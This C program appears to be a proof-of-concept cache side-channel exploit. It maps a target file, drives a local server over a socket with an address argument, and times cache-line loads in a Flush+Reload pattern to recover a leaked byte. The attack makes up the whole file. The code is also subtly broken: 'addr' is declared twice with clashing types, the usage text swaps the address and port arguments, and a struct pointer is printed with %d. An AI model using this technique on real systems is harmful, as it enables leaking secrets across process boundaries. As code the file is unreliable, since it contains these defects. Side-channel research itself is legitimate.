#include <stdio.h>
#include "cache.h"
#include "utils.h"

static const char *argv0;
void usage() {
    const char *usage =
        "usage: %1$s addr port target offset\n";
    fprintf(stderr, usage, argv0);
    exit(1);
}

static void *map_file(const char *file, size_t offset) {
    int fd = trycall(open(file, O_RDONLY, 0666), "open file");
    char *mem = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, fd, offset & ~0xfff);
    if (mem == MAP_FAILED) { perror("mmap"); exit(errno); }
    /* mlock(mem, 0x1000); */
    return mem + (offset & 0xfff);
}

int main(int argc, char *const argv[]) {
    argv0 = argv[0];
    if (argc != 5)
        usage();

    char *end;
    size_t addr = strtoul(argv[2], &end, 0);
    if (*end != '\0')
        usage();
    const char *target = argv[3];
    size_t offset = strtoul(argv[4], &end, 0);
    if (*end != '\0')
        usage();
    const char *mem = map_file(target, offset);

    int sock = socket(PF_INET, SOCK_STREAM, 0); check("socket");
    struct addrinfo *addr;
    getaddrinfo("localhost", argv[1], NULL, &addr); check("getaddrinfo");
    connect(sock, addr->ai_addr, addr->ai_addrlen); check("connect");
    char buf[100];
    int len = sprintf(buf, "%d 0\n", addr);

    char hist[256] = {};
    for (int i = 0; i < 100; i++) {
        // send some commands
        for (int i = 0; i < 1000; i++)
            write(sock, buf, len);
        // observe the results
        for (int j = 0; j < 256; j++) {
            int i = ((j * 167) + 13) & 0xff;
            char *ptr = &mem[i * 0x100];
            uint64_t clocks = time_load(ptr);
            flush(ptr);
            if (clocks < THRESHOLD)
                hist[i]++;
        }
    }
    int max = 0; 
    unsigned char ch = 0;
    for (int i = 0; i < 256; i++) {
        if (hist[i] > max) {
            max = hist[i];
            ch = i;
        }
    }
    printf("%c %d\n", ch, max);
}
